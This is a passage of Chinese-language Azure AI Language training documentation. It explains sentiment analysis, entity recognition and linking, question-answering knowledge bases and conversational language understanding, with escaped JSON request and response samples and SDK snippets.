\u0026#34;id\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;keyPhrases\u0026#34;: [ \u0026#34;miles\u0026#34;, \u0026#34;single step\u0026#34;, \u0026#34;journey\u0026#34; ], \u0026#34;warnings\u0026#34;: [] } ], \u0026#34;errors\u0026#34;: [], \u0026#34;modelVersion\u0026#34;: \u0026#34;2021-06-01\u0026#34; } } 分析情绪 情绪分析用于评估文本文档的正负面情绪程度，这在各种工作负载中非常有用，例如：\n通过基于评论量化情绪来评估电影、书籍或产品。 确定客户服务对通过电子邮件或社交媒体消息传送收到的函件的响应的优先级。 使用 Azure AI 语言评估情绪时，响应包括向服务提交的每个文档的总体文档情绪和单个句子情绪。\n例如，可以提交单个文档进行情绪分析，如下所示：\n{ \u0026#34;kind\u0026#34;: \u0026#34;SentimentAnalysis\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;modelVersion\u0026#34;: \u0026#34;latest\u0026#34; }, \u0026#34;analysisInput\u0026#34;: { \u0026#34;documents\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;language\u0026#34;: \u0026#34;en\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;Good morning!\u0026#34; } ] } } 来自服务的响应可能如下所示：\n{ \u0026#34;kind\u0026#34;: \u0026#34;SentimentAnalysisResults\u0026#34;, \u0026#34;results\u0026#34;: { \u0026#34;documents\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;sentiment\u0026#34;: \u0026#34;positive\u0026#34;, \u0026#34;confidenceScores\u0026#34;: { \u0026#34;positive\u0026#34;: 0.89, \u0026#34;neutral\u0026#34;: 0.1, \u0026#34;negative\u0026#34;: 0.01 }, \u0026#34;sentences\u0026#34;: [ { \u0026#34;sentiment\u0026#34;: \u0026#34;positive\u0026#34;, \u0026#34;confidenceScores\u0026#34;: { \u0026#34;positive\u0026#34;: 0.89, \u0026#34;neutral\u0026#34;: 0.1, \u0026#34;negative\u0026#34;: 0.01 }, \u0026#34;offset\u0026#34;: 0, \u0026#34;length\u0026#34;: 13, \u0026#34;text\u0026#34;: \u0026#34;Good morning!\u0026#34; } ], \u0026#34;warnings\u0026#34;: [] } ], \u0026#34;errors\u0026#34;: [], \u0026#34;modelVersion\u0026#34;: \u0026#34;2022-11-01\u0026#34; } } 句子情绪基于 0 到 1 之间的正面、负面和中性分类值的置信度分数。\n总体文档情绪基于句子：\n如果所有句子都为中性，则总体情绪为中性。 如果句子分类仅包括正面和中性，则总体情绪为正面。 如果句子分类仅包括负面和中性，则总体情绪为负面。 如果句子分类包括正面和负面，则总体情绪是混合的。 提取实体 命名实体识别标识文本中提及的实体。 实体按类别和子类别分组，例如：\n人员 位置 DateTime 组织 地址 电子邮件 URL 实体识别的输入类似于其他语言 Azure AI 语言 API 函数的输入：\n{ \u0026#34;kind\u0026#34;: \u0026#34;EntityRecognition\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;modelVersion\u0026#34;: \u0026#34;latest\u0026#34; }, \u0026#34;analysisInput\u0026#34;: { \u0026#34;documents\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;language\u0026#34;: \u0026#34;en\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;Joe went to London on Saturday\u0026#34; } ] } } 响应包括在每个文档中找到的分类实体的列表：\n{ \u0026#34;kind\u0026#34;: \u0026#34;EntityRecognitionResults\u0026#34;, \u0026#34;results\u0026#34;: { \u0026#34;documents\u0026#34;:[ { \u0026#34;entities\u0026#34;:[ { \u0026#34;text\u0026#34;:\u0026#34;Joe\u0026#34;, \u0026#34;category\u0026#34;:\u0026#34;Person\u0026#34;, \u0026#34;offset\u0026#34;:0, \u0026#34;length\u0026#34;:3, \u0026#34;confidenceScore\u0026#34;:0.62 }, { \u0026#34;text\u0026#34;:\u0026#34;London\u0026#34;, \u0026#34;category\u0026#34;:\u0026#34;Location\u0026#34;, \u0026#34;subcategory\u0026#34;:\u0026#34;GPE\u0026#34;, \u0026#34;offset\u0026#34;:12, \u0026#34;length\u0026#34;:6, \u0026#34;confidenceScore\u0026#34;:0.88 }, { \u0026#34;text\u0026#34;:\u0026#34;Saturday\u0026#34;, \u0026#34;category\u0026#34;:\u0026#34;DateTime\u0026#34;, \u0026#34;subcategory\u0026#34;:\u0026#34;Date\u0026#34;, \u0026#34;offset\u0026#34;:22, \u0026#34;length\u0026#34;:8, \u0026#34;confidenceScore\u0026#34;:0.8 } ], \u0026#34;id\u0026#34;:\u0026#34;1\u0026#34;, \u0026#34;warnings\u0026#34;:[] } ], \u0026#34;errors\u0026#34;:[], \u0026#34;modelVersion\u0026#34;:\u0026#34;2021-01-15\u0026#34; } } 若要了解有关实体的详细信息，请参阅生成对话语言理解模型模块。\n提取链接的实体 在某些情况下，相同的名称可能适用于多个实体。 例如，“Venus”一词的实例是指行星还是神话中的女神？\n实体链接可用于通过引用知识库中的文章来区分同名的实体。 维基百科为文本分析服务提供了知识库。 根据文本中的实体上下文确定特定文章链接。\n例如，“I saw Venus shining in the sky”与链接 https://en.wikipedia.org/wiki/Venus 相关联，而“Venus, the goddess of beauty”与 https://en.wikipedia.org/wiki/Venus_(mythology) 相关联。\n与所有 Azure AI 语言服务函数一样，你可以提交一个或多个文档进行分析：\n{ \u0026#34;kind\u0026#34;: \u0026#34;EntityLinking\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;modelVersion\u0026#34;: \u0026#34;latest\u0026#34; }, \u0026#34;analysisInput\u0026#34;: { \u0026#34;documents\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;language\u0026#34;: \u0026#34;en\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;I saw Venus shining in the sky\u0026#34; } ] } } 响应包括文本中标识的实体以及指向相关文章的链接：\n{ \u0026#34;kind\u0026#34;: \u0026#34;EntityLinkingResults\u0026#34;, \u0026#34;results\u0026#34;: { \u0026#34;documents\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;entities\u0026#34;: [ { \u0026#34;bingId\u0026#34;: \u0026#34;89253af3-5b63-e620-9227-f839138139f6\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Venus\u0026#34;, \u0026#34;matches\u0026#34;: [ { \u0026#34;text\u0026#34;: \u0026#34;Venus\u0026#34;, \u0026#34;offset\u0026#34;: 6, \u0026#34;length\u0026#34;: 5, \u0026#34;confidenceScore\u0026#34;: 0.01 } ], \u0026#34;language\u0026#34;: \u0026#34;en\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;Venus\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://en.wikipedia.org/wiki/Venus\u0026#34;, \u0026#34;dataSource\u0026#34;: \u0026#34;Wikipedia\u0026#34; } ], \u0026#34;warnings\u0026#34;: [] } ], \u0026#34;errors\u0026#34;: [], \u0026#34;modelVersion\u0026#34;: \u0026#34;2021-06-01\u0026#34; } } 情绪分析有助于确定文本是负面的还是正面的 链接的实体可用于区分同名的常见实体\n使用 Azure AI 语言创建问题解答解决方案 智能”应用程序的常见模式是使用户能够使用自然语言提问并收到相应的答案。 实际上，此类解决方案将对话智能引入传统的常见问题解答 (FAQ) 发布。 本模块介绍如何使用 Azure AI 语言创建可支持应用程序或机器人的问答对知识库。\n了解问题解答及其与语言理解的比较。 创建、测试、发布和使用知识库。 实现多回合对话和主动学习。 创建使用自然语言进行交互的问题解答机器人。\n了解问题解答 已完成\n借助包括问题解答功能的 Azure AI 语言，可以定义可使用自然语言输入查询的问答对知识库。 知识库可以发布到 REST 终结点，并供客户端应用程序（通常是机器人）使用。\n可以从现有源创建知识库，其中包括：\n包含常见问题解答 (FAQ) 文档的网站。 包含结构化文本的文件，如手册或用户指南。 内置的闲聊问题和用于封装常见对话交流的答案对。 注意\nAzure AI 语言的问题解答功能是 QnA 服务的较新版本，该服务仍作为独立的服务存在。 若要了解如何将 QnA Maker 知识库迁移到 Azure AI 语言，请参阅迁移指南。\n比较问题解答和 Azure AI 语言理解 已完成\n问题解答知识库是语言模型的一种形式，它会提出有关何时使用问题解答的问题，以及何时使用 Azure AI 语言的对话语言理解功能。\n这两项功能的相似之处在于，它们都允许定义可以使用自然语言表达式查询的语言模型。 但是，它们旨在解决的用例存在一些差异，如下表所示：\n| | 问答 | 语言理解 | | +++ | +++ | +++ | | 使用模式 | 用户提交问题，需要答案 | 用户提交言语，需要适当的响应或操作 | | 查询处理 | 服务使用自然语言理解将问题与知识库中的答案进行匹配 | 服务使用自然语言理解来解释言语、将其与意向匹配，以及识别实体 | | 响应 | 响应是已知问题的静态答案 | 响应指示最有可能的意向和引用实体 | | 客户端逻辑 | 客户端应用程序通常向用户提供答案 | 客户端应用程序负责根据检测到的意向执行适当的操作 |\n实际上，这两个服务是互补的。 可以构建综合的自然语言解决方案，将语言理解模型与问题解答知识库结合起来。\n创建知识库 若要创建问题解答解决方案，可以使用 REST API 或 SDK 编写用于定义、训练和发布知识库的代码。 不过，更常见的是使用 Language Studio Web 界面来定义和管理知识库。\n若要创建知识库，请执行以下步骤：\n登录到 Azure 门户。\n使用门户顶部的搜索字段搜索“Azure AI 服务”。\n选择“语言服务”资源下的“创建”。\n在 Azure 订阅中创建资源：\n启用问题解答功能。 创建或选择“Azure AI 搜索”资源来托管知识库索引。 在 Language Studio 中，选择“Azure AI 语言”资源并创建“自定义问题解答”项目。\n添加一个或多个数据源以填充知识库：\n包含 FAQ 的 Web 页面的 URL。 包含可以从中派生出问题和解答的结构化文本的文件。 预定义的闲聊数据集，其中包括指定样式的常见对话问题和响应。 在门户中编辑问答对。\n实现多回合对话 已完成\n尽管通常可以创建由单个问答对组成的有效知识库，但有时可能需要在提供明确答案之前询问后续问题，以便从用户那里获取更多信息。 这种交互称为多回合对话。\n根据现有网页或文档的结构从现有网页或文档中导入问答时，可以启用多回合响应，或者可以为现有问答对显式定义跟进提示和响应。\n例如，假设旅行预订知识库的初始问题是“如何取消预订？”。 预订可能指酒店或航班，因此需要跟进提示来阐明此详细信息。 答案可能包含“取消策略取决于预订类型”之类的文本，并包含跟进提示，以及有关取消航班和取消酒店的答案链接。\n定义多回合对话的跟进提示时，可以链接到知识库中的现有答案，或专门为跟进定义新答案。 还可以限制链接答案，以便它仅显示在由原始问题发起的多回合对话的上下文中。\n测试并发布知识库 ​ ​ 定义知识库后，可以训练其自然语言模型并测试该模型，然后发布，以便在应用程序或机器人中使用。 ​\n测试知识库 ​ 你可以在语言工作室中，通过提交问题并查看返回的答案来交互测试知识库。 可以检查结果以查看其置信度分数以及其他可能的答案。 ​ ​\n部署知识库 ​ 如果对知识库的性能满意，可以将其部署到 REST 终结点，客户端应用程序可以使用该函数来提交问题和接收答案。 可以直接从 Language Studio 部署它。 ​\n使用知识库 若要使用已发布的知识库，可以使用 REST 接口。\n函数的最小请求正文包含一个问题，如下所示：\n{ \u0026#34;question\u0026#34;: \u0026#34;What do I need to do to cancel a reservation?\u0026#34;, \u0026#34;top\u0026#34;: 2, \u0026#34;scoreThreshold\u0026#34;: 20, \u0026#34;strictFilters\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;category\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;api\u0026#34; } ] } | properties | 说明 | | +++ | +++ | | 问题 | 要发送到知识库的问题。 | | top | 要返回的最大答案数。 | | scoreThreshold | 返回的答案的分数阈值。 | | strictFilters | 限制为仅包含指定元数据的答案。 |\n响应包括知识库中最接近的问题匹配，以及关联的答案、置信度分数和有关问答对的其他元数据：\n{ \u0026#34;answers\u0026#34;: [ { \u0026#34;score\u0026#34;: 27.74823341616769, \u0026#34;id\u0026#34;: 20, \u0026#34;answer\u0026#34;: \u0026#34;Call us on 555 123 4567 to cancel a reservation.\u0026#34;, \u0026#34;questions\u0026#34;: [ \u0026#34;How can I cancel a reservation?\u0026#34; ], \u0026#34;metadata\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;category\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;api\u0026#34; } ] } ] } 提高问题解答性能 创建和测试知识库后，可以通过“主动学习”和定义“同义词”来改善其性能。\n使用主动学习 主动学习可帮助你进行持续改进，以便随着时间的推移更好地正确回答用户问题。 人们经常会问一些措辞不同但最终含义相同的问题。 在此类情况下，主动学习会有所帮助，因为它可以让你考虑每个问答对的备选问题。 默认情况下，主动学习处于启用状态。\n若要使用主动学习，可以执行以下操作：\n创建问答对 在 Language Studio 中为项目创建问题和答案对。 还可以导入包含要批量上传的问答对的文件。\n审阅建议 然后，主动学习开始为问答对中的每个问题提供备选问题。 可从“查看建议”窗格访问此内容：\n查看，然后通过选择备选短语旁边的复选标记或删除符号来接受或拒绝针对每个问题建议的这些备选短语。 可以使用顶部的“接受所有建议”或“拒绝所有建议”选项批量接受或拒绝建议。\n在“编辑知识库”窗格中为对选择“添加备选问题”时，还可以手动添加备选问题：\n定义同义词 当用户提交的问题可能包含多个不同的字词来表示相同内容时，同义词很有用。 例如，一家旅游代理商的客户可能会提到“预留”或“预订”。 通过将这些关键词定义为同义词，无论个人客户使用哪一术语，问题解答服务都可以找到相应的答案。\n若要定义同义词，请使用 REST API 按以下 JSON 格式提交同义词：\n{ \u0026#34;synonyms\u0026#34;: [ { \u0026#34;alterations\u0026#34;: [ \u0026#34;reservation\u0026#34;, \u0026#34;booking\u0026#34; ] } ] } 可以从现有文档或网页创建知识库。 若要向问题添加多回合上下文，请定义跟进提示。 你可以为已发布的知识库创建机器人，并配置电子邮件通信通道。\n生成对话语言理解模型 介绍 自然语言处理 (NLP) 是一个常见的 AI 问题，即软件必须能够以人类用户书写或说话所用的自然语言形式处理文本或语音。 在更广泛的 NLP 领域中，自然语言理解 (NLU) 处理从自然语言确定语义含义的问题，通常使用训练的语言模型来确定。\n自然语言理解解决方案的常见设计模式如下所示：\n在此设计模式中：\n应用接受来自用户的自然语言输入。 语言模型用于确定语义含义（用户的意向）。 应用执行相应操作。 Azure AI 语言使开发人员能够基于可使用数量相对较少的示例训练的语言模型来生成应用，从而识别用户的预期含义。\n本模块介绍如何相关服务来创建使用 Azure AI 语言的自然语言理解应用。\n完成此模块后，你将能够：\n预配 Azure AI 语言资源。 定义意向、实体和语句。 使用模式区分相似的言语。 使用预生成的实体组件。 训练、测试、发布和查看模型。 了解 Azure AI 语言服务的预生成功能 Azure AI 语言服务提供各种功能来理解人类语言。 可以使用每项特征更好地与用户通信，更好地了解传入通信，或者使用多项特征以便更深入地了解用户所表达内容、意向和询问内容。\nAzure AI 语言服务功能分为两类：预配置的功能和习得的功能。 学习到的特征需要生成和训练一个模型来正确预测适当的标签，本模块即将推出的单元将对此进行介绍。\n本单元会介绍 Azure AI 语言服务的大部分功能，但请参考 Azure AI 语言服务文档获取完整列表，其中包括快速入门和所有可用内容的完整说明。\n在应用中使用这些特征需要将查询发送到相应的终结点。 用于查询特定特征的终结点各不相同，但所有这些终结点都带有在 Azure 帐户中创建的 Azure AI 语言资源前缀，无论是生成 REST 请求，还是使用 SDK 定义客户端。 可以在下一个单元中找到每个示例。\n预配置的功能 Azure AI 语言服务提供的部分功能不需要任何模型标记和训练。 创建资源后，可以发送数据并在应用中使用返回的结果。\n以下功能都是预配置的。\n汇总 摘要可用于文档和对话，可将文本汇总到关键句中，系统通过对关键句进行预测来概括输入的含义。\n命名实体识别 命名实体识别可以提取和标识实体（如人员、地点或公司），使应用能够识别不同类型的实体，从而改进自然语言响应。 例如能从“The waterfront pier is my favorite Seattle attraction”中识别出“Seattle”，并将其分类为地点。\n个人身份信息 (PII) 检测 使用 PII 检测，可以识别、分类和编辑可能被视为敏感信息的信息，例如电子邮件地址、家庭地址、IP 地址、姓名和受保护的运行状况信息。 例如，如果查询中包含文本“email@contoso.com”，则可以识别和修改整个电子邮件地址。\n关键短语提取 关键短语提取是可快速从提供的文本中提取主要概念的功能。 例如，该服务能从“Text Analytics is one of the features in Azure AI Services.”中识别出“Azure AI Services”和“Text Analytics”。\n情绪分析 情绪分析标识字符串或文档是正面还是负面的。 例如该服务能从“Great hotel. Close to plenty of food and attractions we could walk to”中识别出正面的结果，且具有相对较高的置信度分数。\n语言检测 语言检测采用一个或多个文档，并识别每个文档的语言。 例如该服务能从其中一份“Bonjour”文档识别出法语的结果。\n学习的功能 学习的功能要求你标记数据、训练和部署模型，使其可在应用程序中使用。 这些功能允许自定义预测或提取的信息。\n注意\n数据质量极大地影响模型的准确性。 请留意使用的数据、数据的标记情况以及训练数据的多样化程度。 有关详细信息，请参阅有关标记数据的建议，其中包括针对标记数据的宝贵指南。 另请参阅评估指标，可帮助你了解模型需要改进的地方。\n对话语言理解 (CLU) CLU 是 Azure AI 语言提供的核心自定义功能之一。 CLU 可帮助用户生成自定义自然语言理解模型来预测整体意向，并从传入言语中提取重要信息。 CLU 要求用户标记数据，以让其学习如何准确预测意向和实体。\n本模块中的练习将生成 CLU 模型并在应用中使用它。\n自定义命名实体识别 自定义实体识别采用自定义标记数据，并从非结构化文本中提取指定的实体。 例如，如果有需要从中提取当事人的各种合同文档，可以通过训练模型让模型知道如何进行预测。\n自定义文本分类 使用自定义文本分类，用户可以将文本或文档分类为自定义组。 例如，可以训练模型来查看新闻文章，并确定这些信息的所述类别，例如“新闻”或“娱乐”。\n问答 问题解答是一项在大多数情况下会预配的功能，可解答作为输入提供的问题。 回答这些问题的数据来自常见问题解答或手册等文档。\n例如，假设你想要在公司网站上创建虚拟聊天助手来回答常见问题。 可以使用公司常见问题解答作为输入文档来创建问题和答案对。 部署后，聊天助手可以将输入问题传递给服务，并以结果形式获取解答。\n若要查看功能的完整列表以及使用方法，请参阅 Azure AI 语言文档。\n了解用于生成对话语言理解模型的资源 9 分钟 若要使用语言理解服务开发 NLP 解决方案，需要在 Azure 中创建语言资源。 该资源将用于创作模型和处理来自客户端应用程序的预测请求。\n提示\n本模块的实验室介绍如何构建用于对话语言理解的模型。 有关自定义文本分类和自定义命名实体识别的更多重点模块，请参阅开发自然语言解决方案学习路径中的自定义解决方案模块。\n构建你的模型 对于需要模型进行预测的功能，需要先生成、训练并部署模型，才能将其用于预测。 通过生成和训练让 Azure AI 语言服务学习要查找的内容。\n首先，需要在 Azure 门户中创建 Azure AI 语言资源。 然后：\n搜索 Azure AI 服务。 查找并选择“语言服务”。 选择“语言服务”下的“创建”。 填写必要的详细信息，选择在地理位置上最靠近的区域（以获得最佳性能），并为其提供唯一的名称。 创建该资源后，需要密钥和终结点。 可以在资源概述页的“密钥和终结点”下的左侧找到该信息。\n使用语言工作室 若要更直观地生成、训练和部署模型，可以使用 Language Studio 来实现上述每个步骤。 在主页上，可以选择创建对话语言理解项目。 创建项目后，请完成与上述内容相同的过程来生成、训练和部署模型。\n本模块中的实验室将逐步讲解如何使用 Language Studio 生成模型。 若要了解详细信息，请参阅 Language Studio 快速入门\n使用 REST API 生成模型的一种方法是通过 REST API 生成。 该模式是创建项目、导入数据、训练、部署，然后使用模型。\n这些任务以异步方式完成；需要向每个步骤的相应 URI 提交请求，然后发送另一个请求以获取该作业的状态。\n例如，如果要为对话语言理解项目部署模型，则需要提交部署作业，然后检查部署作业状态。\n身份验证 对于对 Azure AI 语言资源的每个调用，可以通过提供以下标头对请求进行身份验证。\n| 密钥 | 值 | | +++ | +++ | | Ocp-Apim-Subscription-Key | 资源密钥 |\n请求部署 将 POST 请求提交到以下终结点。\n{ENDPOINT}/language/authoring/analyze-conversations/projects/{PROJECT-NAME}/deployments/{DEPLOYMENT-NAME}?api-version={API-VERSION} | 占位符 | 值 | 示例 | | +++ | +++ | +++ | | {ENDPOINT} | Azure AI 语言资源的终结点 | https://\u0026lt;your-subdomain\u0026gt;.cognitiveservices.azure.com | | {PROJECT-NAME} | 项目名称。 此值区分大小写 | myProject | | {DEPLOYMENT-NAME} | 部署名称。 此值区分大小写 | staging | | {API-VERSION} | 要调用的 API 版本 | 2022-05-01 |\n请在请求中包括以下 body。\n{ \u0026#34;trainedModelLabel\u0026#34;: \u0026#34;{MODEL-NAME}\u0026#34;, } | 占位符 | 值 | | +++ | +++ | | {MODEL-NAME} | 将要分配给部署的模型名称。 此值区分大小写。 |\n若成功提交请求，将收到 202 响应，并带有响应标头 operation-location。 此标头将具有一个 URL，用于请求状态，格式如下所示：\n{ENDPOINT}/language/authoring/analyze-conversations/projects/{PROJECT-NAME}/deployments/{DEPLOYMENT-NAME}/jobs/{JOB-ID}?api-version={API-VERSION} 获取部署状态 将 GET 请求提交到上述响应标头中的 URL。 这些值已根据初始部署请求填写。\n{ENDPOINT}/language/authoring/analyze-conversations/projects/{PROJECT-NAME}/deployments/{DEPLOYMENT-NAME}/jobs/{JOB-ID}?api-version={API-VERSION} | 占位符 | 值 | | +++ | +++ | | {ENDPOINT} | 用于对 API 请求进行身份验证的终结点 | | {PROJECT-NAME} | 项目名称（值区分大小写） | | {DEPLOYMENT-NAME} | 部署名称（值区分大小写） | | {JOB-ID} | 用于查找模型训练状态的 ID，可在上文部署请求中详述的标头值中找到 | | {API-VERSION} | 要调用的 API 版本 |\n响应正文将提供部署状态详细信息。 当部署完成时，status 字段的值会为“已成功”。\n{ \u0026#34;jobId\u0026#34;:\u0026#34;{JOB-ID}\u0026#34;, \u0026#34;createdDateTime\u0026#34;:\u0026#34;String\u0026#34;, \u0026#34;lastUpdatedDateTime\u0026#34;:\u0026#34;String\u0026#34;, \u0026#34;expirationDateTime\u0026#34;:\u0026#34;String\u0026#34;, \u0026#34;status\u0026#34;:\u0026#34;running\u0026#34; } 若要查看示例请求的每个步骤的完整演练，请参阅对话理解快速入门。\n查询你的模型 若要查询模型以进行预测，可以使用 C# 或 Python 中的 SDK，也可以使用 REST AP。\n使用 SDK 进行查询 若要使用 SDK 查询你的模型，你首先需要创建客户端。 具有客户端后，即可使用它来调用相应的终结点。\nvar languageClient = new TextAnalyticsClient(endpoint, credentials); var response = languageClient.ExtractKeyPhrases(document); language_client = TextAnalyticsClient( endpoint=endpoint, credential=credentials) response = language_client.extract_key_phrases(documents = documents)[0] 其他语言功能（例如对话语言理解）要求以不同的方式构建和发送请求。\nvar data = new { analysisInput = new { conversationItem = new { text = userText, id = \u0026#34;1\u0026#34;, participantId = \u0026#34;1\u0026#34;, } }, parameters = new { projectName, deploymentName, // Use Utf16CodeUnit for strings in .NET. stringIndexType = \u0026#34;Utf16CodeUnit\u0026#34;, }, kind = \u0026#34;Conversation\u0026#34;, }; Response response = await client.AnalyzeConversationAsync(RequestContent.Create(data)); result = client.analyze_conversation( task={ \u0026#34;kind\u0026#34;: \u0026#34;Conversation\u0026#34;, \u0026#34;analysisInput\u0026#34;: { \u0026#34;conversationItem\u0026#34;: { \u0026#34;participantId\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;modality\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;language\u0026#34;: \u0026#34;en\u0026#34;, \u0026#34;text\u0026#34;: query }, \u0026#34;isLoggingEnabled\u0026#34;: False }, \u0026#34;parameters\u0026#34;: { \u0026#34;projectName\u0026#34;: cls_project, \u0026#34;deploymentName\u0026#34;: deployment_slot, \u0026#34;verbose\u0026#34;: True } } ) 使用 REST API 进行查询 若要使用 REST 查询你的模型，请使用指定的相应正文创建对相应 URL 的 POST 请求。 对于内置功能（如语言检测或情绪分析），你将查询 analyze-text 终结点。\n提示\n请记住，每个请求都需要使用 Ocp-Apim-Subscription-Key 标头中的 Azure AI 语言资源密钥进行身份验证\n{ENDPOINT}/language/:analyze-text?api-version={API-VERSION} | 占位符 | 值 | | +++ | +++ | | {ENDPOINT} | 用于对 API 请求进行身份验证的终结点 | | {API-VERSION} | 要调用的 API 版本 |\n在该请求的正文中，必须指定 kind 参数，该参数告知服务你所请求的语言理解类型。\n例如，如果想要检测语言，则 JSON 正文将如下所示。\n{ \u0026#34;kind\u0026#34;: \u0026#34;LanguageDetection\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;modelVersion\u0026#34;: \u0026#34;latest\u0026#34; }, \u0026#34;analysisInput\u0026#34;:{ \u0026#34;documents\u0026#34;:[ { \u0026#34;id\u0026#34;:\u0026#34;1\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;This is a document written in English.\u0026#34; } ] } } 其他语言功能（例如对话语言理解）要求将请求路由到其他终结点。 例如，对话语言理解请求将被发送到以下位置。\n{ENDPOINT}/language/:analyze-conversations?api-version={API-VERSION} | 占位符 | 值 | | +++ | +++ | | {ENDPOINT} | 用于对 API 请求进行身份验证的终结点 | | {API-VERSION} | 要调用的 API 版本 |\n该请求将包含类似于以下内容的 JSON 正文。\n{ \u0026#34;kind\u0026#34;: \u0026#34;Conversation\u0026#34;, \u0026#34;analysisInput\u0026#34;: { \u0026#34;conversationItem\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;participantId\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;Sample text\u0026#34; } }, \u0026#34;parameters\u0026#34;: { \u0026#34;projectName\u0026#34;: \u0026#34;{PROJECT-NAME}\u0026#34;, \u0026#34;deploymentName\u0026#34;: \u0026#34;{DEPLOYMENT-NAME}\u0026#34;, \u0026#34;stringIndexType\u0026#34;: \u0026#34;TextElement_V8\u0026#34; } } | 占位符 | 值 | | +++ | +++ | | {PROJECT-NAME} | 生成模型的项目的名称 | | {DEPLOYMENT-NAME} | 部署的名称 |\n示例响应 来自 SDK 的查询响应将出现在返回的对象中，具体取决于功能（例如在 response.key_phrases 或 response.Value 中）。 REST API 将返回类似于以下内容的 JSON。\n{ \u0026#34;kind\u0026#34;: \u0026#34;KeyPhraseExtractionResults\u0026#34;, \u0026#34;results\u0026#34;: { \u0026#34;documents\u0026#34;: [{ \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;keyPhrases\u0026#34;: [\u0026#34;modern medical office\u0026#34;, \u0026#34;Dr. Smith\u0026#34;, \u0026#34;great staff\u0026#34;], \u0026#34;warnings\u0026#34;: [] }], \u0026#34;errors\u0026#34;: [], \u0026#34;modelVersion\u0026#34;: \u0026#34;{VERSION}\u0026#34; } } 对于对话语言理解等其他模型，对查询的示例响应将类似于以下内容。\n{ \u0026#34;kind\u0026#34;: \u0026#34;ConversationResult\u0026#34;, \u0026#34;result\u0026#34;: { \u0026#34;query\u0026#34;: \u0026#34;String\u0026#34;, \u0026#34;prediction\u0026#34;: { \u0026#34;topIntent\u0026#34;: \u0026#34;intent1\u0026#34;, \u0026#34;projectKind\u0026#34;: \u0026#34;Conversation\u0026#34;, \u0026#34;intents\u0026#34;: [ { \u0026#34;category\u0026#34;: \u0026#34;intent1\u0026#34;, \u0026#34;confidenceScore\u0026#34;: 1 }, { \u0026#34;category\u0026#34;: \u0026#34;intent2\u0026#34;, \u0026#34;confidenceScore\u0026#34;: 0 } ], \u0026#34;entities\u0026#34;: [ { \u0026#34;category\u0026#34;: \u0026#34;entity1\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;offset\u0026#34;: 7, \u0026#34;length\u0026#34;: 4, \u0026#34;confidenceScore\u0026#34;: 1 } ] } } } Python 和 C# 的 SDK 返回与 REST 响应非常相似的 JSON。\n有关功能的完整文档（包括示例和操作指南），请参阅 Azure AI 语言文档的文档页。\n定义意向、言语和实体 语句是用户在与使用语言模型的应用程序进行交互时可能输入的短语。 意向表示用户想执行的任务或操作，或更简单地表示言语的含义。 通过定义意向并将其与一个或多个言语关联来创建模型。\n例如，考虑下面包含意向和关联言语的列表：\nGetTime： “What time is it?” “What is the time?” “Tell me the time” GetWeather： “What is the weather forecast?” “Do I need an umbrella?” “Will it snow?” TurnOnDevice “Turn the light on.” “Switch on the light.” “Turn on the fan” 无： \u0026ldquo;Hello\u0026rdquo; “Goodbye” 在你的模型中，你必须定义你希望模型能够理解的意向，因此请花一些时间思考模型必须支持的领域，以及用户可能请求的操作或信息类型。 除了你定义的意向之外，每个模型还包括“无”意向，应使用该意向来显式标识用户可能提交的言语，但不需要为其执行特定操作（例如，“hello”之类的对话问候语）或超出此模型的域范围。\n确定模型必须支持的目标后，务必要为每个意向捕获各种不同的示例言语。 收集你认为用户将输入的言语；包括含义相同，但用不同方式构造而成的言语。 请牢记这些准则：\n捕获多个不同的示例或同一事物的不同说法 采用不同的言语长度：短、中、长 使言语中的名词或主体位于不同位置。 将其放在开头、末尾或中间 在不同的言语中使用正确的和不正确的语法来提供良好的训练数据示例 标记数据的精度、一致性和完整性是确定模型性能的关键因素。 精确标记：始终将每个实体标记为正确的类型。 仅包含要提取的内容，避免标签中出现不必要的数据。 一致标记：同一实体在所有语句中都应具有相同的标记。 完全标记：标记所有语句中实体的所有实例。 实体用于向意向添加特定上下文。 例如，可以定义可应用于多个设备的 TurnOnDevice 意向，并使用实体定义不同的设备。\n请考虑以下言语、意向和实体：\n| 话语 | 意向 | 实体 | | +++ | +++ | +++ | | What is the time? | GetTime | | | What time is it in London? | GetTime | Location (London) | | What\u0026rsquo;s the weather forecast for Paris? | GetWeather | Location (Paris) | | Will I need an umbrella tonight? | GetWeather | Time (tonight) | | What\u0026rsquo;s the forecast for Seattle tomorrow? | GetWeather | Location (Seattle), Time (tomorrow) | | Turn the light on. | TurnOnDevice | Device (light) | | Switch on the fan. | TurnOnDevice | Device (fan) |\n可以将实体拆分为几个不同的组件类型：\n学习实体是最灵活的实体类型，应在大多数情况下使用。 使用合适的名称定义学习组件，然后在训练言语中将单词或短语与该实体关联。 训练模型时，将了解如何将言语中的相应元素与实体匹配。 